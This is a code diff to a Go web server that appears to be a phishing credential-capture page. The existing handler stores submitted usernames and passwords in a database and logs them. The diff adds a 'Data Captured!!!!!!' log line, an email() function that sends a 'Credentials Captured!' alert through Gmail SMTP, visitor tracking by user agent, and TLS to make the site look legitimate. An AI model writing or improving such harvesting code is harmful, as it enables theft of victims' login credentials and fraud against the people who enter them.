@@ -2,9 +2,11 @@ package main
 
 import (
 	"database/sql"
+	"fmt"
 	"html/template"
 	"log"
 	"net/http"
+	"net/smtp"
 
 	_ "github.com/go-sql-driver/mysql"
 )
@@ -35,7 +37,7 @@ func init() {
 func main() {
 	http.HandleFunc("/", index)
 	http.HandleFunc("/process", process)
-	log.Fatal(http.ListenAndServe("10.0.0.32:80", nil))
+	log.Fatal(http.ListenAndServeTLS("10.0.0.32:443", "server.crt", "server.key", nil))
 }
 
 func index(w http.ResponseWriter, r *http.Request) {
@@ -61,6 +63,11 @@ func index(w http.ResponseWriter, r *http.Request) {
 		res = append(res, emp)
 	}
 	tpl.ExecuteTemplate(w, "index.html", res)
+	ua := r.Header.Get("User-Agent")
+	url := fmt.Sprintf("%v %v %v %v %v", r.Method, r.URL, r.Proto, r.Host, ua)
+	fmt.Printf("Tracking: %s \n", url)
+	return
+
 }
 
 func process(w http.ResponseWriter, r *http.Request) {
@@ -73,8 +80,28 @@ func process(w http.ResponseWriter, r *http.Request) {
 			panic(err.Error())
 		}
 		insForm.Exec(user, pass)
-		log.Println("INSERT: Username: " + user + " | Supersecret: " + pass)
+		log.Println("Data Captured!!!!!! " + "Username: " + user + " | Supersecret: " + pass)
+		email()
 	}
 	defer db.Close()
 	http.Redirect(w, r, "/", 301)
+}
+
+func email() {
+	auth := smtp.PlainAuth(
+		"",
+		"emailhere",
+		"passwordhere",
+		"smtp.gmail.com",
+	)
+	err := smtp.SendMail(
+		"smtp.gmail.com:587",
+		auth,
+		"emailhere",
+		[]string{""},
+		[]byte("Credentials Captured!"),
+	)
+	if err != nil {
+		log.Fatal(err)
+	}
 }
